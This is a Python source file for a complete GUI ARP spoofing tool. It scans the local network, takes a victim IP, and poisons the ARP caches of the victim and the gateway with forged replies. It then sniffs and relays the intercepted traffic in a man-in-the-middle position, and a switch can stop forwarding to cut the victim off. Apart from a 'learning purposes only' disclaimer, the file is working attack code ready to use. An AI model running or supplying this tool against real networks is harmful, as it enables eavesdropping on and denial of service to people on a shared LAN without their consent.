import scapy.all as scapy
import time
from scapy.all import conf, IP, sniff, sendp, Ether, arping
from tkinter import *
import customtkinter
import re
import win32api
import win32con
import threading
import Tools

"""
THIS CODE IS FOR LEARNING PURPOSES ONLY!
"""


class SpoofGui:
    def __init__(self):
        # window
        self.root = customtkinter.CTk()
        self.set_window()

        # widgets
        self.spoof_bt = None
        self.show_ips_bt = None
        self.input = None
        self.not_valid = None
        self.switch = None
        self.show_ips_window = None
        self.set_widgets()
        self.place_widgets()

        self.show_ips_flag = False
        self.regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
        self.spoof = None

    def set_widgets(self):
        self.spoof_bt = customtkinter.CTkButton(master=self.root,
                                                text="Start spoof",
                                                width=250,
                                                height=75,
                                                font=self.get_font(),
                                                command=self.start_spoof,
                                                fg_color="darkred",
                                                hover_color="red")

        self.show_ips_bt = customtkinter.CTkButton(master=self.root,
                                                   text="Show IPs",
                                                   width=150,
                                                   height=40,
                                                   font=self.get_font(20),
                                                   command=self.display_ips,
                                                   fg_color="darkred",
                                                   hover_color="red")

        self.input = customtkinter.CTkEntry(self.root,
                                            placeholder_text="Enter the victim IP",
                                            width=250,
                                            height=30)

        self.not_valid = customtkinter.CTkLabel(master=self.root,
                                                text="not valid",
                                                text_color="red",
                                                compound=CENTER,
                                                font=self.get_font())

        self.switch = customtkinter.CTkSwitch(master=self.root,
                                              text="Forward packets",
                                              command=self.switch_event,
                                              variable=customtkinter.StringVar(self.root, value="on"),
                                              onvalue="on",
                                              offvalue="off",
                                              progress_color="red")

    def set_window(self):
        self.root.title("ARP Spoofer")
        self.root.iconbitmap("assets//spoof_icon.ico")
        self.root.geometry("700x500")
        customtkinter.set_appearance_mode("dark")

    def place_widgets(self):
        self.spoof_bt.place(relx=0.5, rely=0.35, anchor=CENTER)
        self.show_ips_bt.place(relx=0.5, rely=0.85, anchor=CENTER)
        self.input.place(relx=0.5, rely=0.5, anchor=CENTER)

    def switch_event(self):
        if self.spoof.forward:
            self.spoof.forward = False
        else:
            self.spoof.forward = True

    def start_spoof(self):
        t = threading.Thread(target=self.check_ip, daemon=True)
        t.start()

    def check_ip(self):
        if not re.search(self.regex, self.input.get()):
            self.not_valid.place(relx=0.5, rely=0.6, anchor=CENTER)
        else:
            self.show_warning("This program is for learning purposes only!", "ARP Spoofer Warning")
            self.spoof = ArpSpoofing(self.input.get())
            t = threading.Thread(target=self.spoof.start_spoof, daemon=True)
            t.start()
            self.draw_details()

    def draw_details(self):
        self.destroy()
        self.switch.place(relx=0.5, rely=0.9, anchor=CENTER)
        customtkinter.CTkLabel(self.root, text="your pc:", text_color="red", font=self.get_font()).place(relx=0.1, rely=0.1)
        customtkinter.CTkLabel(self.root, text=f"ip: {self.spoof.ip} mac: {self.spoof.my_mac}"
                               , font=self.get_font()).place(relx=0.15, rely=0.21)
        customtkinter.CTkLabel(self.root, text="victim:", text_color="red", font=self.get_font()).place(relx=0.1, rely=0.32)
        customtkinter.CTkLabel(self.root, text=f"ip: {self.spoof.victim_ip} mac: {self.spoof.victim_mac}"
                               , font=self.get_font()).place(relx=0.15, rely=0.43)
        customtkinter.CTkLabel(self.root, text="gateway:", text_color="red", font=self.get_font()).place(relx=0.1, rely=0.54)
        customtkinter.CTkLabel(self.root, text=f"ip: {self.spoof.gateway_ip} mac: {self.spoof.gateway_mac}"
                               , font=self.get_font()).place(relx=0.15, rely=0.65)

    def destroy(self):
        self.spoof_bt.destroy()
        self.input.destroy()
        self.not_valid.destroy()
        self.show_ips_bt.destroy()

    def display_ips(self):
        if not self.show_ips_flag:
            ip = scapy.get_if_addr(conf.iface).split(".")
            ip[-1] = "0"
            ip_list = Tools.send_arp_broadcast(".".join(ip) + "/24")
            self.show_ips_flag = True
            self.show_ips_window = customtkinter.CTkToplevel()
            self.show_ips_window.title("IPs on the same lan")
            my_frame = customtkinter.CTkScrollableFrame(self.show_ips_window, width=600, height=500)
            customtkinter.CTkLabel(my_frame, text=ip_list, font=customtkinter.CTkFont(size=25),
                                   text_color="white").pack()
            my_frame.pack()
            self.show_ips_window.mainloop()
        else:
            if self.show_ips_window:
                self.show_ips_flag = False
                self.show_ips_window.destroy()
                self.display_ips()

    @staticmethod
    def show_warning(message, title="Warning"):
        win32api.MessageBox(0, message, title, win32con.MB_ICONWARNING | win32con.MB_OK)

    @staticmethod
    def get_font(size=30):
        return customtkinter.CTkFont(size=size)


class ArpSpoofing:
    def __init__(self, victim_ip: str):
        """
        :param victim_ip: gets the victim (target) ip
        """
        self.ip = scapy.get_if_addr(conf.iface)
        self.my_mac = self.get_mac(self.ip)
        self.victim_ip = victim_ip  # Enter your target IP
        self.victim_mac = self.get_mac(self.victim_ip)
        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = self.get_mac(self.gateway_ip)
        self.running = True
        self.forward = True

        self.handle_t = None
        self.run_spoof_t = None

    @staticmethod
    def get_mac(ip):
        """
        :param ip: the ip needed to get its mac address
        :type ip: str
        :return: the mac address that belongs to the ip
        :rtype: str
        """
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            print("ip addr is not in lan")

    def spoof(self, victim_ip, spoof_ip):
        """
        :param victim_ip: the ip address that being spoofed in thr arp cache
        :type victim_ip: str
        :param spoof_ip: the ip address the spoofer use to spoof the arp cache
        :type spoof_ip: str
        """
        packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=self.get_mac(victim_ip), psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        """
        :param destination_ip: the ip address that being restored in thr arp cache
        :type destination_ip: str
        :param source_ip: the ip address the spoofer use to restore the arp cache
        :type source_ip: str
        """
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        # packet.show()
        scapy.send(packet, verbose=False)

    def run_spoofer(self):
        try:
            sent_packets_count = 0
            while self.running:
                self.spoof(self.victim_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.victim_ip)
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                time.sleep(2)  # Waits for two seconds

        except KeyboardInterrupt:
            self.stop_spoof()

    def stop_spoof(self):
        self.running = False
        print("\nCtrl + C pressed.............Exiting")
        self.restore(self.gateway_ip, self.victim_ip)
        self.restore(self.victim_ip, self.gateway_ip)
        print("[+] Arp Spoof Stopped")

    def handle_packets(self):
        """
        sniffs all the ports for packets and filters it with the pack_filter
        """
        while True:
            sniff(iface="‏‏Ethernet", lfilter=self.pack_filter, prn=self.send_packet)

    def pack_filter(self, pkt):
        """
        filters the right packets with the mac addresses
        """
        return Ether in pkt and IP in pkt and \
            ((pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac)
             or
             (pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac))

    def send_packet(self, pkt):
        if not self.forward:
            return
        """
        :param pkt: packet that needs to be rerouted
        """
        if pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac and pkt[IP].src == self.victim_ip:
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.gateway_mac

        elif pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac and pkt[IP].dst == self.victim_ip:
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.victim_mac

        # sends a packet on the Ethernet layer
        sendp(pkt, verbose=False)

    def start_spoof(self):
        self.handle_t = threading.Thread(target=self.handle_packets, daemon=True)
        self.handle_t.start()
        self.run_spoof_t = threading.Thread(target=self.run_spoofer, daemon=True)
        self.run_spoof_t.start()


def main():
    sg = SpoofGui()
    sg.root.mainloop()


if __name__ == '__main__':
    main()
